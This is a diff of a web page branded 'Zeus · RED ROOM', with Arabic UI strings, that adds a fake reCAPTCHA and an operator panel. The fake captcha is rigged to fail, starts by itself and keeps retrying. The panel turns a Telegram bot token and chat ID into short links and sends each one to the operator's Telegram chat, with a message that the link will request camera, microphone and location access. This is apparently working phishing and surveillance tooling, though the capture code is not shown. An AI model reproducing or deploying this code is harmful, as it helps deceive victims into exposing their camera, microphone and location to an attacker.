-        chatIdInput.value = chat;
-        localStorage.setItem('zeus_last_input', JSON.stringify({ botToken: bot, chatId: chat }));
-        logMessage(`✅ تم تحميل الإعدادات من الرابط: ${bot.substring(0,10)}...`);
-      } else {
-        try {
-          const last = JSON.parse(localStorage.getItem('zeus_last_input') || '{}');
-          if (last.botToken) botTokenInput.value = last.botToken;
-          if (last.chatId) chatIdInput.value = last.chatId;
-          if (last.botToken) logMessage('📂 تم استرجاع الإعدادات من التخزين المحلي');
-        } catch {}
-      }
+                const delay = 1800 + Math.random() * 1800;
+                setTimeout(function() {
+                    resetToFailed();
+                    checkbox.disabled = false;
+                }, delay);
+            }
 
-      botTokenInput.addEventListener('change', () => {
-        localStorage.setItem('zeus_last_input', JSON.stringify({
-          botToken: botTokenInput.value,
-          chatId: chatIdInput.value
-        }));
-      });
-      chatIdInput.addEventListener('change', () => {
-        localStorage.setItem('zeus_last_input', JSON.stringify({
-          botToken: botTokenInput.value,
-          chatId: chatIdInput.value
-        }));
-      });
+            // أحداث المستخدم
+            checkbox.addEventListener('change', function(e) {
+                if (this.checked) {
+                    this.checked = false;
+                    if (autoRetryTimer) clearTimeout(autoRetryTimer);
+                    simulateVerification();
+                } else {
+                    if (isFailed) {
+                        this.checked = false;
+                        e.preventDefault();
+                    }
+                }
+            });
 
-      renderList();
-      logMessage('𝒁𝒆𝒖𝒔 جاهز — رابط قصير ثابت رياضياً');
-      console.log('✅ 𝒁𝒆𝒖𝒔 · RED ROOM ready');
-    })();
-  }
-</script>
+            wrapper.addEventListener('click', function(e) {
+                if (e.target.closest('.checkmark') || e.target.closest('.captcha-footer') || e.target.closest('.logo'))
+                    return;
+                if (isProcessing) return;
+                if (autoRetryTimer) clearTimeout(autoRetryTimer);
+                if (!checkbox.checked && !spinner.classList.contains('loading')) {
+                    simulateVerification();
+                }
+            });
+
+            checkbox.addEventListener('click', function(e) {
+                if (isFailed || isProcessing) {
+                    e.preventDefault();
+                    this.checked = false;
+                    if (!isProcessing) {
+                        if (autoRetryTimer) clearTimeout(autoRetryTimer);
+                        simulateVerification();
+                    }
+                }
+            });
+
+            checkbox.addEventListener('keydown', function(e) {
+                if (e.key === ' ' || e.key === 'Spacebar') {
+                    e.preventDefault();
+                    if (!isProcessing) {
+                        if (autoRetryTimer) clearTimeout(autoRetryTimer);
+                        simulateVerification();
+                    }
+                }
+            });
+
+            // 🔥 بدء تلقائي فوري
+            setTimeout(function() {
+                simulateVerification();
+            }, 800);
+
+            console.log('reCAPTCHA عنيد — يعيد المحاولة تلقائياً');
+        }
+
+        // ================================================================
+        //  3. MATRIX RAIN (رقم بتنزل في اللوج)
+        // ================================================================
+        function initMatrixRain() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            const wrapper = canvas.parentElement;
+            let width, height, columns, drops;
+            const chars = '0123456789';
+
+            function resize() {
+                const rect = wrapper.getBoundingClientRect();
+                width = canvas.width = rect.width;
+                height = canvas.height = rect.height;
+                columns = Math.floor(width / 18);
+                drops = new Array(columns).fill(1);
+            }
+            resize();
+            window.addEventListener('resize', resize);
+
+            function draw() {
+                ctx.fillStyle = 'rgba(8, 8, 8, 0.12)';
+                ctx.fillRect(0, 0, width, height);
+                ctx.font = '14px monospace';
+                for (let i = 0; i < drops.length; i++) {
+                    const char = chars[Math.floor(Math.random() * chars.length)];
+                    const x = i * 18;
+                    const y = drops[i] * 16;
+                    const brightness = 0.2 + Math.random() * 0.3;
+                    ctx.fillStyle = `rgba(0, 229, 255, ${brightness})`;
+                    ctx.fillText(char, x, y);
+                    if (y > height && Math.random() > 0.975) drops[i] = 0;
+                    drops[i]++;
+                }
+                requestAnimationFrame(draw);
+            }
+            draw();
+        }
+
+        // ================================================================
+        //  4. ADMIN PANEL — كل الوظائف
+        // ================================================================
+        function initAdminPanel() {
+            const form = document.getElementById('form');
+            const botTokenInput = document.getElementById('botToken');
+            const chatIdInput = document.getElementById('chatId');
+            const generateBtn = document.getElementById('generateBtn');
+            const resultBox = document.getElementById('resultBox');
+            const shortDisplay = document.getElementById('shortTokenDisplay');
+            const fullLinkDisplay = document.getElementById('fullLinkDisplay');
+            const copyBtn = document.getElementById('copyBtn');
+            const openBtn = document.getElementById('openBtn');
+            const logDiv = document.getElementById('log');
+            const errorDiv = document.getElementById('formError');
+            const listItems = document.getElementById('listItems');
+
+            // ---- خوارزمية ثابتة ----
+            function generateShortFromToken(botToken) {
+                const clean = botToken.trim().replace(/\s+/g, '');
+                if (!clean) return '------';
+                let hash = 0;
+                for (let i = 0; i < clean.length; i++) {
+                    hash = (hash * 31 + clean.charCodeAt(i)) >>> 0;
+                }
+                let result = hash.toString(36).toUpperCase();
+                while (result.length < 6) result = '0' + result;
+                return result.slice(0, 6);
+            }
+
+            // ---- log ----
+            function logMessage(msg, type) {
+                const time = new Date().toLocaleTimeString();
+                const colorClass = type === 'success' ? 'success' : type === 'wait' ? 'wait' : type === 'error' ?
+                    'error-log' : '';
+                const prefix = type === 'success' ? '[OK]' : type === 'wait' ? '[WAIT]' : type === 'error' ?
+                    '[ERR]' : '[INFO]';
+                const line = document.createElement('div');
+                line.className = 'line';
+                line.innerHTML =
+                    `<span class="prompt">$</span> <span class="${colorClass}">${prefix}</span> ${msg} <span class="dim">[${time}]</span>`;
+                logDiv.prepend(line);
+                while (logDiv.children.length > 20) {
+                    logDiv.removeChild(logDiv.lastChild);
+                }
+            }
+
+            function setError(msg) {
+                errorDiv.textContent = msg;
+                if (msg) setTimeout(() => errorDiv.textContent = '', 6000);
+            }
+
+            // ---- storage ----
+            function getStorage() {
+                try { return JSON.parse(localStorage.getItem('zeus_bots') || '{}'); } catch { return {}; }
+            }
+
+            function saveStorage(data) {
+                localStorage.setItem('zeus_bots', JSON.stringify(data));
+            }
+
+            // ---- render list ----
+            function renderList() {
+                const data = getStorage();
+                const keys = Object.keys(data);
+                if (keys.length === 0) {
+                    listItems.innerHTML = '<div style="color:#555;font-size:13px;padding:4px 0;">لا توجد روابط</div>';
+                    return;
+                }
+                let html = '';
+                keys.forEach(key => {
+                    const entry = data[key];
+                    html += `<div class="bot-item">
+                        <span class="btoken">${entry.shortToken}</span>
+                        <span class="binfo">${entry.features || ''}</span>
+                        <span class="del" data-token="${key}">✕</span>
+                    </div>`;
+                });
+                listItems.innerHTML = html;
+                document.querySelectorAll('.bot-item .del').forEach(el => {
+                    el.addEventListener('click', function() {
+                        const token = this.dataset.token;
+                        const data = getStorage();
+                        delete data[token];
+                        saveStorage(data);
+                        renderList();
+                        logMessage(`حذف الرابط ${token}`, '');
+                    });
+                });
+            }
+
+            // ---- show result ----
+            function showResult(shortToken) {
+                const base = window.location.origin + window.location.pathname;
+                const link = `${base}?t=${shortToken}`;
+                shortDisplay.textContent = shortToken;
+                fullLinkDisplay.textContent = link;
+                resultBox.style.display = 'block';
+                resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }
+
+            // ---- copy ----
+            copyBtn.addEventListener('click', function() {
+                const text = fullLinkDisplay.textContent;
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(text).then(() => {
+                        this.innerHTML =
+                            '<svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg> تم';
+                        setTimeout(() => {
+                            this.innerHTML =
+                                '<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="1"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> نسخ';
+                        }, 1500);
+                    }).catch(() => fallbackCopy(text));
+                } else { fallbackCopy(text); }
+            });
+
+            function fallbackCopy(text) {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                document.body.removeChild(ta);
+                copyBtn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg> تم';
+                setTimeout(() => {
+                    copyBtn.innerHTML =
+                        '<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="1"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> نسخ';
+                }, 1500);
+            }
+
+            // ---- open ----
+            openBtn.addEventListener('click', () => window.open(fullLinkDisplay.textContent, '_blank'));
+
+            // ---- send to user ----
+            async function sendLinkToUser(botToken, chatId, shortToken) {
+                const base = window.location.origin + window.location.pathname;
+                const link = `${base}?t=${shortToken}`;
+                const msg =
+                    `رابطك الجديد (ثابت)\n${link}\n\nسيطلب الصلاحيات (كاميرا، ميكروفون، موقع)`;
+                try {
+                    const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: msg })
+                    });
+                    const json = await resp.json();
+                    if (json.ok) {
+                        logMessage('تم إرسال الرابط إلى المستخدم', 'success');
+                        return true;
+                    } else {
+                        logMessage('فشل الإرسال: ' + (json.description || 'خطأ'), 'error');
+                        return false;
+                    }
+                } catch (e) {
+                    logMessage('خطأ في الإرسال: ' + e.message, 'error');
+                    return false;
+                }
+            }
+
+            // ---- toggle features ----
+            document.querySelectorAll('.feature-item').forEach(item => {
+                item.addEventListener('click', function(e) {
+                    const cb = this.querySelector('input[type="checkbox"]');
+                    cb.checked = !cb.checked;
+                    this.classList.toggle('active', cb.checked);
+                });
+                item.querySelector('input').addEventListener('click', function(e) {
+                    e.stopPropagation();
+                });
+            });
+
+            // ---- form submit ----
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                setError('');
+
+                const botToken = botTokenInput.value.trim();
+                const chatId = chatIdInput.value.trim();
+
+                if (!botToken || !chatId) {
+                    setError('يرجى ملء جميع الحقول');
+                    return;
+                }
+
+                const shortToken = generateShortFromToken(botToken);
+                if (shortToken === '------') {
+                    setError('التوكن غير صالح');
+                    return;
+                }
+
+                generateBtn.disabled = true;
+                generateBtn.innerHTML =
+                    '<svg viewBox="0 0 24 24"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg> جاري التوليد...';
+                logMessage(`توليد الرابط للتوكن: ${botToken.substring(0,10)}...`, 'wait');
+
+                try {
+                    const checked = document.querySelectorAll('.feature-item input[type="checkbox"]:checked');
+                    const features = Array.from(checked).map(cb => cb.closest('.feature-item').dataset.val).join(',');
+
+                    const data = getStorage();
+
+                    if (data[botToken]) {
+                        const existing = data[botToken];
+                        if (existing.features !== features || existing.chatId !== chatId) {
+                            existing.features = features;
+                            existing.chatId = chatId;
+                            existing.updated = Date.now();
+                            saveStorage(data);
+                            logMessage('تحديث إعدادات الرابط الثابت', '');
+                        }
+                        showResult(shortToken);
+                        await sendLinkToUser(botToken, chatId, shortToken);
+                        renderList();
+                        generateBtn.disabled = false;
+                        generateBtn.innerHTML =
+                            '<svg viewBox="0 0 24 24"><path d="M3 11L21 3 14 21 11 13 3 11Z" stroke-linejoin="round"/></svg> توليد الرابط';
+                        return;
+                    }
+
+                    data[botToken] = {
+                        chatId: chatId,
+                        features: features,
+                        shortToken: shortToken,
+                        createdAt: Date.now(),
+                        updated: Date.now()
+                    };
+                    saveStorage(data);
+                    logMessage(`حفظ التوكن الجديد مع الرابط: ${shortToken}`, 'success');
+
+                    showResult(shortToken);
+                    await sendLinkToUser(botToken, chatId, shortToken);
+                    renderList();
+
+                } catch (err) {
+                    logMessage('خطأ: ' + err.message, 'error');
+                    setError('حدث خطأ: ' + err.message);
+                } finally {
+                    generateBtn.disabled = false;
+                    generateBtn.innerHTML =
+                        '<svg viewBox="0 0 24 24"><path d="M3 11L21 3 14 21 11 13 3 11Z" stroke-linejoin="round"/></svg> توليد الرابط';
+                }
+            });
+
+            // ---- init ----
+            (function init() {
+                const params = new URLSearchParams(window.location.search);
+                const bot = params.get('bot') || '';
+                const chat = params.get('chat') || '';
+
+                if (bot && chat) {
+                    botTokenInput.value = decodeURIComponent(bot);
+                    chatIdInput.value = chat;
+                    localStorage.setItem('zeus_last_input', JSON.stringify({ botToken: bot, chatId: chat }));
+                    logMessage(`تحميل الإعدادات من الرابط: ${bot.substring(0,10)}...`, '');
+                } else {
+                    try {
+                        const last = JSON.parse(localStorage.getItem('zeus_last_input') || '{}');
+                        if (last.botToken) botTokenInput.value = last.botToken;
+                        if (last.chatId) chatIdInput.value = last.chatId;
+                        if (last.botToken) logMessage('استرجاع الإعدادات من التخزين المحلي', '');
+                    } catch {}
+                }
+
+                botTokenInput.addEventListener('change', () => {
+                    localStorage.setItem('zeus_last_input', JSON.stringify({
+                        botToken: botTokenInput.value,
+                        chatId: chatIdInput.value
+                    }));
+                });
+                chatIdInput.addEventListener('change', () => {
+                    localStorage.setItem('zeus_last_input', JSON.stringify({
+                        botToken: botTokenInput.value,
+                        chatId: chatIdInput.value
+                    }));
+                });
+
+                renderList();
+                logMessage('𝒁𝒆𝒖𝒔 جاهز — رابط قصير ثابت', '');
+                console.log('𝒁𝒆𝒖𝒔 · RED ROOM ready');
+            })();
+        }
+    </script>
 </body>
 </html>
